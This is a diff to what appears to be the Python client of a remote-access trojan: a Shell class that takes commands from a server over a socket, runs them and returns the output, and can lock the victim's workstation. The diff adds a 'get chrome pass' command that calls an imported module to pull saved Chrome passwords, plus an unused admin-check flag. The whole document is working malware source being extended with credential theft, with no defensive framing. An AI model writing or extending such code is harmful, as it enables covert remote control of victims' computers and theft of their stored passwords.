@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 import ctypes
+import cp
 
 
 class Shell:
@@ -21,7 +22,7 @@ class Shell:
         """
         Executes received commands from the server and sends the output back through the socket
         """
-
+        check_admin_flag = False
         while 1:  # Infinite loop
             try:
                 # Gets cwd and sends to server
@@ -55,6 +56,10 @@ class Shell:
                 if data == "lock":
                     ctypes.windll.user32.LockWorkStation()
                     data = "echo Screen locked"
+                
+                # Gets all chrome passwords
+                if data == "get chrome pass":
+                    cp.get_chrome_pass()
                     
                 # Checks if client has admin rights
                 if data == "check admin":
@@ -83,3 +88,7 @@ class Shell:
 
             except socket.error:
                 continue
+
+    
+
+
